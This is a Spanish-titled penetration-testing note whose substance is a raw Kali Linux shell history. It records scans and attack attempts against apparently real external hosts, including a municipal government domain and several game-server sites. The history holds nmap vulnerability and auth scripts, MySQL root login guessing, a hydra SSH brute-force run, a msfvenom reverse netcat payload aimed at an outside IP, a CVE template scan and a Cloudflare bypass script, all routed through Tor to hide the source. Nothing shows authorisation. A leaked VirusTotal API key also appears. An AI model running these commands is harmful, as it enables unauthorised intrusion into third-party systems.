# Pruebas Penetración de Servcios

## `OSINT`: Herramientas

## `NMAP`: Cook book

## Pruebas automatizadas

## `Brute force` a servicios

^[[200~sudo apt update~
    2  sudo apt update
    3  apt list --upgradable
    4  sudo apt-get kali-desktop-gnome
    5  sudo apt-get kali-desktop-gnom
    6  sudo apt update && sudo apt-get kali-desktop-gnome
    7  sudo apt-get upgrade
    8  sudo apt-get dist-upgrade
    9  sudo apt-get kali-desktop-gnome
   10  sudo apt update
   11  sudo apt install kali-desktop-gnome
   12  reboot
   13  sudo apt install gnome-tweak-tool
   14  sudo apt install kali-gnome-tweak-tool
   15  sudo apt-get install gnome-tweak-tool
   16  mkdir ~/Templates
   17  touch ~/Templates/Text\ File.txt
   18  ping 10.20.30.48
   19  nmap
   20  nmap --script "vuln" -p445 10.20.30.48
   21  nmap --script "vuln" -p80 10.20.30.48
   22  ping heredia.go.cr
   23  nmap --script "vuln" -p80 45.60.162.137
   24  cat /etc/os-release
   25  hostnamectl
   26  ls
   27  open
   28  ls
   29  open .
   30  dpkg -i Nessus-10.5.0-debian10_amd64.deb
   31  sudo dpkg -i Nessus-10.5.0-debian10_amd64.deb
   32  msfconsole
   33  nmap -sV -p - www.heredia.go.cr
   34  whatweb
   35  whatweb https://heredia.go.cr
   36  whatweb https://contraloria.heredia.go.cr/
   37  searchsploit Drupal 9
   38  whatweb https://contraloria.heredia.go.cr/
   39  searchsploit Drupal 9
   40  ^[[200~nmap --script "vuln" -p80 https://hanabi-ro.com/login
   41  nmap --script "vuln" -p80 https://hanabi-ro.com/login
   42  nmap --script "vuln" -p80 hanabi-ro.com
   43  searchsploit
   44  searchsploit Apache Tomcat
   45  sudo snap install video-downloader
   46  mfconsole
   47  msfconsole
   48  whatweb https://hanabi-ro.com/login
   49  whatweb https://cp.macab-ro.cl/~
   50  whatweb https://cp.macab-ro.cl
   51  searchsploit php 7.4
   52  msfconsole
   53  aot update
   54  apt update
   55  apt 
   56  apt update
   57  sudo apt uptade
   58  sudo apt update
   59  sudo apt list --upgradable
   60  sudo apt upgrade
   61  sudo apt full-upgrade -y
   62  sudo apt search metagoofil
   63  sudo apt install metagoofil
   64  metagoofil
   65  metagoofil -h
   66  sudo metagoofil -d www.heredia.go.cr -l 100 -n 20 -t doc,docx,pdf -o /tmp/archivos
   67  apt install proxychains4 -y
   68  su
   69  sudo apt install proxychains4 -y
   70  vim /etc/proxychains4.conf
   71  ls
   72  mkdir /tmp/archivos
   73  ls
   74  cd Templates
   75  ls
   76  cd ..
   77  ls
   78  sudo mkdir /tmp/archivos
   79  ls
   80  cd tmp
   81  sudo mkdir /tmp/
   82  sudo mkdir tmp
   83  cd t
   84  mkdir archivos
   85  sudo mkdir archivos
   86  ls
   87  cd tmp
   88  sudo mkdir archivos
   89  cd ..
   90  vim /etc/proxychains4.conf
   91  sudo vim /etc/proxychains4.conf
   92  sudo proxychains4 metagoofil -d www.heredia.go.cr -l 100 -n 20 -t doc,docx,pdf -o /tmp/archivos
   93  sudo metagoofil -d www.heredia.go.cr -l 100 -n 20 -t doc,docx,pdf -o /tmp/archivos
   94  sudo metagoofil -d reuters.com -l 100 -n 20 -t doc,docx,pdf -o /tmp/archivos
   95  sudo metagoofil -d reuters.com -l 100 -n 20 -t doc,docx,pdf -o /home/kali/tmp/archivos
   96  sudo proxychains4  metagoofil -d reuters.com -l 100 -n 20 -t doc,docx,pdf -o /home/kali/tmp/archivos
   97  locate proxychains
   98  sudo metagoofil -d reuters.com -l 100 -n 20 -t doc,docx,pdf -o /home/kali/tmp/archivos
   99  sudo metagoofil -d reuters.com -l 100 -n 20 -t doc,docx,pdf -o /home/kali/tmp/archivos -f file.html
  100  sudo metagoofil -d reuters.com -l 100 -n 20 -t doc,docx,pdf
  101  sudo metagoofil -d reuters.com -l 100 -n 20 -t doc,docx,pdf -o -f file.txt
  102  sudo metagoofil -d reuters.com -l 100 -n 20 -t doc,docx,pdf -f file.txt
  103  sudo metagoofil -d www.heredia.go.cr -l 100 -n 20 -t doc,docx,pdf -f analisis.txt
  104  rm -rf /home/kali/tmp
  105  sudo rm -rf /home/kali/tmp
  106  exiftool -r /tmp/archivos/* | egrep -i "Author|Creator|Email|Producer|Template" | sort -
  107  cd ..
  108  cd ~
  109  ls
  110  exiftool -r /tmp/archivos/* | egrep -i "Author|Creator|Email|Producer|Template" | sort -
  111  exiftool -r /tmp/archivos/* | egrep -i "Author|Creator|Email|Producer|Template" | sort -u
  112  sudo apt install metagoofil
  113  meta
  114  metagoofil -h
  115  sudo metagoofil -d www.heredia.go.cr -l 100 -n 20 -e 60  -t doc,docx,pdf -w -o /tmp/archivos
  116  exiftool -r /tmp/archivos/* | egrep -i "Author|Creator|Email|Producer|Template" | sort -u
  117  dnsenum –h
  118  dnsenum www.heredia.go.cr
  119  dnsenum https://www.heredia.go.cr
  120  dnsenum www.heredia.go.cr
  121  dnsenum reuters.com
  122  dnsenum laperla.heredia.go.cr
  123  fierce –-domain www.heredia.go.cr
  124  fierce –-domain heredia.go.cr
  125  fierce –-domain reuters.com
  126  fierce --domain www.heredia.go.cr
  127  fierce --domain heredia.go.cr
  128  dmitry
  129  dmitry -e -n -s -i -w heredia.go.cr
  130  ipconfig
  131  ifconfig
  132  nmap
  133  ls
  134  cd DEsktop
  135  cd Desktop
  136  mkdir 4nonimyzer
  137  ls
  138  cd 4nonimyzer
  139  git clone https://github.com/Hackplayers/4nonimizer.git
  140  cd 4nonimizer
  141  ls
  142  4nonimizer install
  143  ./4nonimizer install
  144  sudo ./4nonimizer install
  145  tor
  146  cd ..
  147  4nonimizer
  148  sudo 4nonimizer
  149  sudo 4nonimizer start
  150  4nonimizer help
  151  sudo 4nonimizer help
  152  sudo 4nonimizer update_app
  153  sudo 4nonimizer start
  154  sudo 4nonimizer help
  155  sudo 4nonimizer test_availability
  156  sudo 4nonimizer help
  157  sudo 4nonimizer proxychains4
  158  sudo 4nonimizer start
  159  cd ..
  160  ls
  161  sudo 4nonimizer uninstall
  162  git clone https://github.com/htrgouvea/nipe && cd nipe
  163  sudo git clone https://github.com/htrgouvea/nipe && cd nipe
  164  cpanm --installdeps .
  165  sudo perl nipe.pl install
  166  ls
  167  sudo perl nipe.pl install
  168  cpanm --installdeps .
  169  sudo perl nipe.pl install
  170  cd ..
  171  nipe.pl
  172  cd nipe
  173  perl nipe.pl status
  174  sudo perl nipe.pl status
  175  sudo perl nipe.pl start
  176  sudo perl nipe.pl status
  177  sudo perl nipe.pl start
  178  sudo perl nipe.pl stop
  179  sudo perl nipe.pl start
  180  sudo perl nipe.pl status
  181  sudo perl nipe.pl stop
  182  sudo perl nipe.pl status
  183  proxychains4
  184  sudo apt install libproxychains4
  185  proxychains4
  186  sudo apt install libproxychains4
  187  proxychains4 --help
  188  sudo proxychains4 --help
  189  sudo proxychains3 --help
  190  proxychains3 --help
  191  proxychains3
  192  proxychains
  193  proxychains4
  194  sudo apt-get update
  195  sudo apt-get upgrade
  196  sudo apt-get install tor
  197  sudo nano etc/proxychains4.conf
  198  cd ~
  199  ls
  200  cd /etc
  201  cd ..
  202  ls
  203  cd ..
  204  ls
  205  cd home
  206  ;s
  207  ls
  208  cd ~
  209  ls
  210  cd /
  211  ls
  212  sudo nano etc/proxychains4.conf
  213  proxychains4
  214  proxychains4 nmap
  215  sudo apt-get uninstall proxychains3
  216  proxychains firefox www.google.com
  217  proxychains
  218  proxychains firefox www.google.com
  219  sudo apt install proxychains4
  220  sudo apt install proxychains4 -y
  221  proxychains4 --help
  222  proxychains firefox www.google.com
  223  tor
  224  service tor status
  225  service tor start
  226  service tor status
  227  service tor stop
  228  locate proxychains
  229  sudo nano etc/proxychains.conf
  230  sudo nano etc/proxychains4.conf
  231  service tor status
  232  locate proxychains
  233  sudo nano etc/proxychains4.conf
  234  cd /
  235  sudo nano etc/proxychains4.conf
  236  sudo nano etc/proxychains.conf
  237  proxychains firefox www.google.com
  238  service tor stop
  239  service tor status
  240  proxychains firefox www.google.com
  241  proxychains help
  242  proxychains --help
  243  service tor start
  244  proxychains firefox www.google.com
  245  ip addr
  246  ping 8.8.8.8 -c 4
  247  gobuster
  248  gobuster -u https://revenge-ro.com/ -w wordlist.txt dir
  249  gobuster -u https://revenge-ro.com/ -w /home/kali/Desktop/HJK/gobuster/wordlist.txt dir
  250  sudo apt-get install bluefish
  251  sudo aptitude install bluefish
  252  apt-get uninstall bluefish
  253  apt remove bluefish
  254  sudo apt remove bluefish
  255  tar xvf Apache_OpenOffice_4.1.14_Linux_x86-64_install-rpm_es.tar.gz
  256  cd es
  257  cd RMPS
  258  cd RPMS
  259  rpm -Uvih *rpm
  260  sudo rpm -Uvih *rpm
  261  tar xvf Apache_OpenOffice_4.1.14_Linux_x86-64_install-rpm_es.tar.gz
  262  tar xvf Apache_OpenOffice_4.1.14_Linux_x86-64_install-deb_es.tar.gz
  263  cd es
  264  cd DEBS
  265  sudo dpkg -i *.deb
  266  cd desktop-integration
  267  sudo dpkg -i *.deb
  268  sudo aptitude purge openoffice.org
  269  sudo apt-get remove openoffice*.*
  270  sudo apt-get install aptitude
  271  sudo aptitude purge openoffice.org
  272  rpm -qa | egrep "^ooo|openoffice" | xargs sudo rpm -e
  273  rpm -e openffice* 
  274  sudo dpkg -l | grep 'openoffice' 
  275  sudo dpkg -r openoffice
  276  sudo apt-get remove --purge openoffice*
  277  sudo apt install *.deb
  278  sudo apt install code.deb
  279  ls
  280  sudo apt install code.deb
  281  sudo apt install ./code.deb
  282  proxychains davtest -url https://revenge-ro.com/
  283  proxychains davtest -url https://revenge-ro.com
  284  davtest -url https://revenge-ro.com
  285  davtest -url https://revenge-ro.com/rankings
  286  netcat
  287  nc.traditional h
  288  nc.traditional -h
  289  nc -v -n -z 172.66.40.64 10-400
  290  proxychains nc -v -n -z 172.66.40.64 10-400
  291  service tor start
  292  proxychains nc -v -n -z 172.66.40.64 10-400
  293  msfvenom
  294  msfvenom -p cmd/unix/reverse_netcat lhost=172.66.40.64 lport=6666 R
  295  proxychains msfvenom -p cmd/unix/reverse_netcat lhost=172.66.40.64 lport=6666 R
  296  proxychains ping 8.8.8.8
  297  proxychains msfvenom -p cmd/unix/reverse_netcat lhost=172.66.40.64 lport=6666 R
  298  nc -lvp 666
  299  nc -lvp 442
  300  nc -lvp 443
  301  proxychains firefox www.google.com
  302  ip addr
  303  dnsrecon
  304  dnsrecon -h
  305  dnsrecon -t brt -d revenge-ro.com
  306  dnsrecon -t brt -d revenge-ro.com -D /usr/share/dnsrecon/namelist.txt
  307  proxychains dnsrecon -t brt -d revenge-ro.com -D /usr/share/dnsrecon/namelist.txt
  308  proxychains dnsrecon -t brt -d revenge-ro.com -D /usr/share/dnsrecon/subdomains-top1mil
  309  proxychains dnsrecon -t brt -d revenge-ro.com -D /usr/share/dnsrecon/subdomains-top1mil.txt
  310  sublister
  311  sublist3r
  312  proxychains sublist3r
  313  proxychains sublist3r -d revenge-ro.com
  314  sublist3r -d revenge-ro.com
  315  proxychains ping 8.8.8.8
  316  service tor start
  317  proxychains ping 8.8.8.8
  318  proxychains sublist3r -d revenge-ro.com
  319  sublist3r -d revenge-ro.com
  320  proxychains sublist3r -d revenge-ro.com
  321  proxychains sublist3r -d revenge-ro.com -v
  322  sublist3r -d revenge-ro.com
  323  sublist3r -d revenge-ro.com -v
  324  export VT_APIKEY=964e883b7015b795068160d3bfe580fad0ad16e07ba1834aa3d16403c264f04a
  325  proxychains sublist3r -d revenge-ro.com -v
  326  sudo settoolkit
  327  sudo setoolkit
  328  sudo proxychains setoolkit
  329  service tor start
  330  sudo proxychains setoolkit
  331  sudo setoolkit
  332  nano /root/.set/reports/2023-04-15 15:31:24.682594.xml
  333  sudo nano /root/.set/reports/2023-04-15 15:31:24.682594.xml
  334  ifconfig
  335  ip addr
  336  ifconfig
  337  ip addr
  338  nmap -sT 10.10.96.66
  339  nmap -sS 104.21.7.190
  340  sudo nmap -sS 104.21.7.190
  341  cd ~
  342  ls
  343  cd .
  344  cd /
  345  ls
  346  cd usr
  347  cd share
  348  ls
  349  cd nmap
  350  ls
  351  cd scripts
  352  cd /usr/share/nmap/scripts & ls
  353  nmap -sT -p- 141.11.199.41
  354  nmap -sU -p- 141.11.199.41
  355  sudo nmap -sU -p- 141.11.199.41
  356  systemctl start postgresql
  357  msfdb init
  358  sudo msfdb init
  359  msfconsole
  360  nmap -f --script auth 192.168.3.164
  361  sudo nmap -f --script auth 192.168.3.164
  362  sudo nmap -f --script auth 192.168.3.164 -d
  363  sudo nmap -f --script vuln 192.168.3.164 -d
  364  sudo proxychains nmap -f --script vuln 141.11.199.41 > ~Desktop/test2.txt
  365  sudo proxychains nmap -f --script vuln 141.11.199.41 -oN ~Desktop/test2.txt
  366  sudo proxychains nmap -f --script vuln 141.11.199.41 > ~/Desktop/test2.txt
  367  service tor start
  368  sudo proxychains nmap -f --script vuln 141.11.199.41 > ~/Desktop/test2.txt
  369  chmod og+X /home
  370  sudo chmod og+X /home
  371  py R-CloudFlareBypasser.py
  372  python R-CloudFlareBypasser.py
  373  nmap -f --script auth 141.11.199.41
  374  sudo nmap -f --script auth 141.11.199.41
  375  sudo nmap -f --script auth 141.11.199.41 -d
  376  sudo nmap -f -sS --script auth 141.11.199.41 -d
  377  sudo nmap -f -sS -PN --script auth 141.11.199.41
  378  sudo-apt-get update
  379  sudo apt-get update
  380  sudo apt-get upgrade
  381  sudo apt-get install gvm*
  382  sudo gvm-setup
  383  sudo apt-get install ufw
  384  sudo ufw enable
  385  sudo ufw allow 80
  386  sudo ufw allow 9392
  387  sudo apt-get install -y greenbone-security-assistant
  388  sudo gvm-check-setup
  389  gvm-start
  390  sudo gvm-start
  391  ifconfig
  392  sudo ufw disable
  393  sudo apt-get remove ufw
  394  sudo apt-get purge ufw
  395  iptables -L
  396  sudo iptables -L
  397  sudo iptables -F
  398  sudo iptables -Z
  399  sudo gvm-start
  400  sudo gvm-stop
  401  sudo gvm-start
  402  sudo openvasmd -create-user admin
  403  sudo runuser -u _gvm -- gvmd --create-user=admin --password=admin
  404  sudo runuser -u _gvm -- gvmd --create-user=isaac --password=isaac
  405  nmap -sV -p-0-1000 141.11.199.41
  406  nmap -sV -p0-1000 141.11.199.41
  407  nmap -sV -p0-1000 141.11.199.41 -v
  408  nmap -sV -p 0-1000 - 141.11.199.41 -v
  409  nmap -PS0-10000 14.11.199.41
  410  nmap -PS0-10000 14.11.199.41 -B
  411  nmap -PS0-10000 14.11.199.41 -V
  412  nmap -PS0-10000 14.11.199.41 -v
  413  nmap -PN -p0-10000 --script=all 141.11.199.41 -v > ~/Desktop/full-revenge-server.txt
  414  nmap -Pn -p3306 --script auth 141.11.199.41
  415  nmap -Pn -p3306 --script auth 141.11.199.41 -v
  416  nmap -Pn  --script auth 141.11.199.41 -v
  417  nmap -sC 141.11.199.41 -v
  418  nmap -sC -p22 141.11.199.41 -v
  419  nmap -p22 -sC 141.11.199.41 -v
  420  nmap -UP 141.11.199.41 -v
  421  nmap -PU 141.11.199.41 -v
  422  sudo nmap -PU 141.11.199.41 -v
  423  sudo nmap -PU -Pn 141.11.199.41 -v
  424  mysql 141.11.199.41 -u root
  425  mysql 141.11.199.41 -u root -p
  426  mysql 141.11.199.41 -u root@localhost
  427  nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 141.11.199.41
  428  nmap -sV -Pn -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 141.11.199.41
  429  mysql 141.11.199.41 -u admin
  430  mysql 141.11.199.41 -u admin -p
  431  mysql 141.11.199.41 -u sysadmin -p
  432  mysql 141.11.199.41 -u sysadmin@localhost
  433  nmap -p3306 --script mysql-empty-password 141.11.199.41
  434  nmap -Pn -p3306 --script mysql-empty-password 141.11.199.41
  435  nmap -p3306 -Pn --script mysql-empty-password 141.11.199.41
  436  nmap -Pn -p 3306 --script mysql-empty-password 141.11.199.41
  437  nmap -Sv -Pn -p 3306 --script mysql-empty-password 141.11.199.41
  438  nmap -sV -Pn -p 3306 --script mysql-empty-password 141.11.199.41
  439  nmap -sV -Pn -p3306 --script mysql-empty-password 141.11.199.41
  440  nmap -sV -Pn --script mysql-empty-password 141.11.199.41
  441  nmap -sV -p0-10000 10.10.69.211
  442  nmap -sV -p0-10000 10.10.69.211 -v
  443  proxychains hydra -L /media/sf_Shared_KALI/WORDLISTS/http_default_users.txt -P /media/sf_Shared_KALI/WORDLISTS/000webhost_passwords.txt -vV 172.67.187.248 ssh -t4
  444  curl https://172.67.187.248:8443/login_up.php
  445  nmap -sV -PN -p0-10000 10.10.69.211 -v
  446  nmap -sV -PN -p0-10000 172.67.187.248 -v
  447  sudo nmap -PR -sn 172.67.187.0/24
  448  dnsrecon revenge-ro.com
  449  dnsrecon -t brt -d revenge-ro.com -D /usr/share/dnsrecon/namelist.txt
  450  dnsrecon -t brt -d 172.67.187.248 -D /usr/share/dnsrecon/namelist.txt
  451  nmap -sV -PN -p0-10000 141.11.199.41 -v
  452  nmap -sV -p0-10000 141.11.199.41 -v
  453  nmap -PN -p0-10000 141.11.199.41 -v
  454  service tor start
  455  proxychainsnmap -PN -p0-10000 81.88.48.71 -v
  456  proxychains nmap -PN -p0-10000 81.88.48.71 -v
  457  nmap -PN -p0-10000 172.67.187.248 -v
  458  nmap -PN -p0-10000 --script=all 172.67.187.248 -v
  459  nmap -PN -p0-10000 --script=all 172.67.187.248 -v > ~/Desktop/full-revenge.txt
  460  \texport VT_APIKEY=964e883b7015b795068160d3bfe580fad0ad16e07ba1834aa3d16403c264f04a\n
  461  proxychains sublist3r -d https://main.woonro.com -v
  462  proxychains sublist3r -d main.woonro.com -v
  463  service tor stop
  464  su sudo
  465  sudo su
  466  proxychains firefox www.google.com
  467  service tor stop
  468  service tor start
  469  proxychains firefox www.google.com
  470  proxychains firefox www.main.woon-ro.com
  471  proxychains firefox www.main.woonro.com
  472  service tor stop
  473  service tor start
  474  proxychains firefox www.main.woonro.com
  475  proxychains firefox https://main.woonro.com/
  476  proxychains msfconsole
  477  proxychains gobuster -u https://main.woonro.com -w /home/kali/Desktop/HJK/gobuster/wordlist.txt dir
  478  service tor start
  479  proxychains gobuster -u https://main.woonro.com -w /home/kali/Desktop/HJK/gobuster/wordlist.txt dir
  480  proxychains gobuster -u https://main.woonro.com -w /media/sf_Shared_KALI/HJK/gobuster/wordlist.txt dir
  481  proxychains gobuster -u https://main.woonro.com -w /media/sf_Shared_KALI/HJK/gobuster/wordlist.txt dir > ~/media/sf_Shared_KALI/analysis/woonro-web.txt
  482  proxychains gobuster -u https://main.woonro.com -w /media/sf_Shared_KALI/HJK/gobuster/wordlist.txt dir -oN ~/media/sf_Shared_KALI/analysis/woonro-web.txt
  483  proxychains gobuster -u https://main.woonro.com -w /media/sf_Shared_KALI/HJK/gobuster/wordlist.txt dir -oN ~/Desktop/moon-web.txt
  484  proxychains gobuster -u https://main.woonro.com -w /media/sf_Shared_KALI/HJK/gobuster/wordlist.txt dir > ~/Desktop/moon-web.txt
  485  proxychains gospider -o gospider -s https://main.moonro.com  -v
  486  service tor start
  487  proxychains gospider -o gospider -s https://main.moonro.com  -v
  488  gospider
  489  ls
  490  rm gospider
  491  r gospider
  492  gospider
  493  ls
  494  rm gospider
  495  rm -rf gospider
  496  proxychains gospider -o ~/Desktop/gospider.txt -t4 -s https://revenge-ro.com  -v
  497  proxychains gospider -o ~/Desktop/gospider -t4 -s https://main.woonro.com  -v
  498  proxychains gospider -o ~/Desktop/gospider -t4 -s https://woonro.com  -v
  499  sudo mkdir /tmp/archivos
  500  sudo proxychains metagoofil -d www.woonro.com -l 100 -n 20 -e 60  -t doc,docx,pdf -w -o /tmp/archivos
  501  metagoofil -h
  502  sudo proxychains metagoofil -d www.woonro.com -l 100 -n 20 -e 80  -t doc,docx,pdf -w -o /tmp/archivos
  503  metagoofil -h
  504  sudo proxychains metagoofil -d www.woonro.com -l 100 -n 20 -e 120  -t doc,docx,pdf -w -o /tmp/archivos
  505  service tor stop
  506  service tor start
  507  service tor status
  508  sudo proxychains metagoofil -d www.woonro.com -l 100 -n 20 -e 120  -t doc,docx,pdf -w -o /tmp/archivos
  509  proxychains firefox google.com
  510  ping 127.0.0.1
  511  ping 127.0.0.1:9050
  512  proxychains firefox google.com
  513  service tor status
  514  dmitry -e -n -s -i -w main.woonro.com
  515  dmitry -e -n -s -i -w https://main.woonro.com
  516  dmitry -e -n -s -i -w https://woonro.com
  517  fierce --domain woonro.com
  518  dnsenum woonro.com
  519  proxychains firefox google.com
  520  sudo netstat -tanp | grep tor
  521  service tor status
  522  sudo vi /etc/tor/torsocks.conf
  523  service tor reload
  524  sudo netstat -tanp | grep tor
  525  proxychains firefox google.com
  526  netstat
  527  netstat -an
  528  netstat -an | grep 9150
  529  sudo netstat -tanp | grep tor
  530  proxychains firefox google.com
  531  nuclei -h
  532  nuclei -u https://battle-ro.com:2083 -t /media/sf_Shared_KALI/CVE-POCs/NUCLEI-GIT/nuclei-templates/http/cves/2023/CVE-2023-29489.yaml -vv
  533  nuclei -u https://woonro.com:2083 -t /media/sf_Shared_KALI/CVE-POCs/NUCLEI-GIT/nuclei-templates/http/cves/2023/CVE-2023-29489.yaml -vv
  534  sudo proxychains metagoofil -d www.woonro.com -l 100 -n 20 -e 120  -t doc,docx,pdf -w -o /tmp/archivos
  535  history 1000
                                                                                
┌──(kali㉿kali)-[~/Desktop/recover]
└─$ 

